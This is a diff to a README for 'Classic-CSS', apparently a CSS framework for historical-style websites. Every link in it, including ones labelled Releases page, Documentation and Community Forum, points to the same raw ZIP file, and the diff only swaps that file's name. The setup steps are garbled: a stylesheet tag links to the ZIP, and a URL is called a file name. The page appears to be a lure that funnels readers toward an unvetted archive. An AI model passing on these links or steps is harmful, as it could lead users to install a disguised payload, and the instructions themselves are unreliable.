@@ -5,7 +5,7 @@
 Welcome to Classic-CSS! This framework helps you build classical, historical, and royal websites quickly and easily. Whether you are a beginner or have some experience, you will find it simple to create beautiful web pages.
 
 ## 📥 Download Classic-CSS
-[![Download Classic-CSS](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip)](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip)
+[![Download Classic-CSS](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip)](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip)
 
 ## 📋 Requirements
 To use Classic-CSS, ensure your device meets these basic requirements:
@@ -24,19 +24,19 @@ Classic-CSS offers:
 ## 🔧 Download & Install
 To start using Classic-CSS, follow the steps below:
 
-1. **Visit the Download Page:** Click this link to go to the Releases page: [Download Classic-CSS](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip).
+1. **Visit the Download Page:** Click this link to go to the Releases page: [Download Classic-CSS](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip).
    
 2. **Choose a Version:** You will see different version numbers listed. Select the latest version to ensure access to the newest features and updates.
 
-3. **Download the Files:** Click on the version you chose. This will bring up options for downloading various files. If you see a file named `https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip`, click on it.
+3. **Download the Files:** Click on the version you chose. This will bring up options for downloading various files. If you see a file named `https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip`, click on it.
 
 4. **Extract the Files:** Once the download is complete, locate the downloaded ZIP file on your computer. Right-click the file and select "Extract All." Choose a folder where you wish to save the content.
 
 5. **Add to Your Project:** Now, you can link Classic-CSS in your HTML file. Open your HTML document and add the following line inside the `<head>` section:
    ```html
-   <link rel="stylesheet" href="https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip">
+   <link rel="stylesheet" href="https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip">
    ```
-   Replace `https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip` with the location where you extracted the files on your computer.
+   Replace `https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip` with the location where you extracted the files on your computer.
 
 6. **Open Your Website:** Open your HTML files in any web browser. You should now see the beautiful styles applied.
 
@@ -62,9 +62,9 @@ If you're interested in contributing to Classic-CSS, we welcome your participati
 Classic-CSS is open-source software; you can use it freely under the terms of the MIT License. For more information, please refer to the license file in the repository.
 
 ## 🔗 Quick Links
-- [Download Classic-CSS](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip)
-- [Documentation](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip)
-- [Community Forum](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/Classic-CSS.zip)
+- [Download Classic-CSS](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/belyse2/Classic-CSS/main/gasteropod/CSS-Classic-v1.2.zip)
 
 Thank you for choosing Classic-CSS! We hope it helps you create stunning websites with ease.
 ```
